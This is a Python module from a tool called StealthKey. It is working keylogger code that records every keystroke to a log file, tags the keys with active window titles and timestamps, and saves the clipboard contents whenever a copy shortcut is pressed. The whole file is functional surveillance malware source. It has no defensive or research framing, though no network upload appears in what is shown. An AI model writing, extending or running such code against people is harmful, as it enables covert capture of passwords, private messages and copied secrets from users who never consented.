"""
Core keyboard monitoring logic for StealthKey.
Handles key press and release events, maps special keys to readable tokens, 
manages clipboard capturing, and provides a secondary periodic cleaning 
mechanism for the logs.
"""

from pynput.keyboard import Key, KeyCode
import time
from datetime import datetime
import pyperclip
from typing import Callable, Optional
try:
    import pygetwindow as gw # type: ignore
except ImportError:
    gw = None

pressed_keys: set[Key | KeyCode] = set()
log_file_getter: Optional[Callable[[], str]] = None
is_first_press: bool = True
last_press_time: float = time.time()
last_active_window: Optional[str] = None

def get_active_window_title() -> str:
    """Retrieves the name of the currently active window on Windows."""
    if gw:
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title
    return "Unknown Window"

def get_last_press_time() -> float:
    """Returns the timestamp of the last captured keystroke."""
    return last_press_time

def set_log_file_getter(getter_func: Callable[[], str]):
    """
    Configures the callback function used to resolve the current log file path.
    
    Args:
        getter_func (function): A function that returns the string path 
                                to the active log file.
    """
    global log_file_getter
    log_file_getter = getter_func

def write_to_file(key: Key | KeyCode):
    """
    Callback for key press events. Captures the key, applies string mapping 
    for readability, handles clipboard logging, and appends the result to the log.
    
    Args:
        key (pynput.keyboard.Key): The key object captured by the listener.
    """
    global pressed_keys, log_file_getter, is_first_press, last_press_time, last_active_window

    # Check ESC first to prevent it from being logged and to exit immediately
    if key == Key.esc:
        return False

    last_press_time = time.time()
    log_file = log_file_getter() if log_file_getter else "log.txt"
    current_window = get_active_window_title()

    if current_window != last_active_window:
        last_active_window = current_window
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n[WINDOW: {current_window}]\n")

    if is_first_press:
        timestamp = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{timestamp} \n")
        is_first_press = False

    pressed_keys.add(key)

    key_str = str(key).replace("'", "")
    key_str = key_str.replace("Key.space", " ")
    key_str = key_str.replace("Key.enter", "\n")
    key_str = key_str.replace("Key.backspace", "backspaceKey")
    key_str = key_str.replace("Key.shift", " shiftPressedKey ")
    key_str = key_str.replace("Key.ctrl", " ctrlKey+ ")
    key_str = key_str.replace("Key.cmd", " cmdKey ")
    key_str = key_str.replace("Key.tab", " tabKey ")
    key_str = key_str.replace("Key.right", " rightKey ")
    key_str = key_str.replace("Key.left", " leftKey ")
    key_str = key_str.replace("Key.up", " upKey ")
    key_str = key_str.replace("Key.down", " downKey ")

    if ((Key.ctrl in pressed_keys and key == KeyCode.from_char('c')) or
        (Key.cmd in pressed_keys and key == KeyCode.from_char('c'))):
        time.sleep(0.1)
        try:
            clipboard_content = pyperclip.paste()
            with open(log_file, "a", encoding="utf-8") as f:
                f.write("\n[CLIPBOARD] " + clipboard_content + "\n")
        except Exception as e:
            print("Error reading clipboard:", e)

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(key_str)

def on_release(key: Key | KeyCode):
    """
    Callback for key release events. Removes the key from the tracking set 
    to handle key combinations correctly.
    
    Args:
        key (pynput.keyboard.Key): The key object released by the user.
    """
    if key in pressed_keys:
        pressed_keys.remove(key)
